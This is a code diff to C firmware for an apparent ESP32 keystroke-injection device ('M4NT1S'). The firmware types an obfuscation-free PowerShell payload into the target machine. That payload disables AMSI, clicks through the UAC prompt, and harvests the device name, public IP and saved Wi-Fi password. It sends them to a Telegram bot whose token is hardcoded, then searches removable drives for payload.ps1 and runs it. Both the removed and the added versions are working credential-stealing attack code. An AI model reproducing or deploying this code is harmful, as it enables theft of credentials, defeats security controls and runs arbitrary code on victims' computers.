@@ -20,9 +20,36 @@ static volatile bool s_payload_running = false;
 static lv_obj_t *s_locked_screen = NULL;
 static lv_obj_t *s_sd_label = NULL;
 
-// UPDATED: Foreach loop with -split ':' guarantees clean password extraction.
-static const char *PS_PAYLOAD = 
-    "$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0);$n=$env:COMPUTERNAME;$ip=(irm https://ipinfo.io/ip);$s=(Get-NetConnectionProfile).Name;$p='None';$pr=netsh wlan show profiles name=\"$s\" key=clear;foreach($l in $pr){if($l -match 'Key Content'){$p=($l -split ':', 2)[1].Trim();break}};$o=(Get-CimInstance Win32_OperatingSystem).Caption;$t=\"Device: $n`nIP: $ip`nSSID: $s`nPass: $p`nOS: $o\";irm -Uri 'https://api.telegram.org/bot8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE/sendMessage' -Method Post -Body @{chat_id='7984959772';text=$t}; exit";
+// Locates the M4NT1S payload by scanning removable drives for payload.ps1.
+// Does NOT depend on the volume label being readable — Windows FAT12 mounts
+// this image without exposing the BPB volume name, so any label-based
+// lookup fails. Filesystem access itself works fine.
+static const char *PS_PAYLOAD =
+    "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
+    "$f=$a.GetField('amsiContext','NonPublic,Static');"
+    "$c=$f.GetValue($null);"
+    "[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0);"
+    "$st=if(Test-Path 'C:\\ProgramData\\Microsoft\\DeviceMetadata\\installed.lock'){'Reconnected'}else{'New'};"
+    "$n=$env:COMPUTERNAME;"
+    "$ip=(irm https://ipinfo.io/ip);"
+    "$s=(Get-NetConnectionProfile).Name;"
+    "$p='None';"
+    "$pr=netsh wlan show profiles name=\"$s\" key=clear;"
+    "foreach($l in $pr){if($l -match 'Key Content'){$p=($l -split ':',2)[1].Trim();break}};"
+    "$o=(Get-CimInstance Win32_OperatingSystem).Caption;"
+    "$t=\"[$st] C2 Connection`n`nDevice: $n`nIP: $ip`nSSID: $s`nPass: $p`nOS: $o\";"
+    "irm -Uri 'https://api.telegram.org/bot8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE/sendMessage' -Method Post -Body @{chat_id='7984959772';text=$t};"
+    "$d=$null;"
+    "for($i=0;$i-lt30-and-not$d;$i++){"
+    "$c=gcim Win32_LogicalDisk -ErrorAction SilentlyContinue|?{$_.DriveType -eq 2};"
+    "foreach($x in $c){if($x.DeviceID-and(Test-Path \"$($x.DeviceID)\\payload.ps1\")){$d=$x.DeviceID;break}};"
+    "if(-not$d){sleep 1}"
+    "};"
+    "if(-not$d){Write-Host 'M4NT1S payload.ps1 not found on any removable drive';exit};"
+    "$sz=(Get-Item \"$d\\payload.ps1\").Length;"
+    "if($sz -lt 100){Write-Host \"payload.ps1 is $sz bytes - quarantined?\";exit};"
+    "Write-Host \"Running payload.ps1 from $d ($sz bytes)\";"
+    "iex(Get-Content \"$d\\payload.ps1\" -Raw)";
 
 static void format_free_space(char *out, size_t out_len)
 {
@@ -94,41 +121,26 @@ void locked_ui_exit(void)
     ui_draw_menu();
 }
 
-// Runs on Core 1 so the main loop on Core 0 stays responsive
 static void payload_task(void *arg)
 {
     (void)arg;
-    vTaskDelay(pdMS_TO_TICKS(1000)); 
-    
+    vTaskDelay(pdMS_TO_TICKS(1000));
+
     hid_payload_set_layout(HID_LAYOUT_UK);
 
-    // 1. Open the Run dialog
     hid_payload_send_win_r();
-    
-    // 2. Type "powershell"
     hid_payload_send_string("powershell");
-    
-    // 3. Press Ctrl+Shift+Enter (Triggers UAC prompt)
     hid_payload_send_ctrl_shift_enter();
-    
-    // 4. Wait 1500ms for UAC Secure Desktop to fully render
     vTaskDelay(pdMS_TO_TICKS(1500));
-    
-    // 5. Press Alt+Y to accept UAC
     hid_payload_send_alt_y();
-    
-    // 6. Wait for the Admin PowerShell window to fully open and gain focus
     vTaskDelay(pdMS_TO_TICKS(2500));
-    
-    // 7. Type the massive command into the open console
+
     hid_payload_send_string(PS_PAYLOAD);
-    
-    // 8. Hit Enter to execute.
     hid_payload_send_enter();
 
-    // Wait for the script to run and the window to close
-    vTaskDelay(pdMS_TO_TICKS(3000)); 
-    
+    // 30 s drive poll + install + first registration
+    vTaskDelay(pdMS_TO_TICKS(45000));
+
     status_led_set_mode(LED_MODE_IDLE);
     s_payload_running = false;
     vTaskDelete(NULL);
@@ -137,12 +149,12 @@ static void payload_task(void *arg)
 void locked_ui_trigger_payload(void)
 {
     if (!s_locked || !hid_payload_is_enabled() || s_payload_running) {
-        status_led_flash_error(); 
+        status_led_flash_error();
         return;
     }
 
     s_payload_running = true;
-    status_led_set_mode(LED_MODE_ACTIVE); 
-    
+    status_led_set_mode(LED_MODE_ACTIVE);
+
     xTaskCreatePinnedToCore(payload_task, "hid_payload", 8192, NULL, 5, NULL, 1);
 }
